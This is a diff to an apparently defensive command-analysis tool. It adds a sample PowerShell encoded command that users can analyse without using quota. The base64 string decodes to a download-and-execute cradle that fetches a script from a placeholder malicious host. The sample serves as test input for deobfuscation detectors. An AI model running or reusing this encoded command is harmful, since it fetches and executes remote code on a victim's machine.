@@ -12,6 +12,9 @@ from config.settings import CACHE_DURATION
 from services.detectors.obfuscation_detector import deobfuscate
 from services.detectors.encoded_command_detector import detect_encoded_command
 from services.detectors.double_encoded_detector import detect_double_encoded_command
+
+# ✅ Example command that doesn't count towards quota
+EXAMPLE_ENCODED_COMMAND = 'powershell -EncodedCommand "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AcwBpAHQAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA" -noExit'
 import Levenshtein
 
 
@@ -613,9 +616,13 @@ async def save_analysis_to_db(
         decoded_cmd = analysis_result.get("decoded_command")
         double_decoded_cmd = analysis_result.get("double_decoded_command")
         
+        # ✅ Check if this is the example command
+        is_example_command = command.strip() == EXAMPLE_ENCODED_COMMAND.strip()
+        
         # ✅ NEW: Determine if analysis has actual decoded content
+        # Example command doesn't count towards quota
         has_decoded_content = bool(
-            decoded_cmd or double_decoded_cmd or deobfuscated_cmd
+            (decoded_cmd or double_decoded_cmd or deobfuscated_cmd) and not is_example_command
         )
         
         
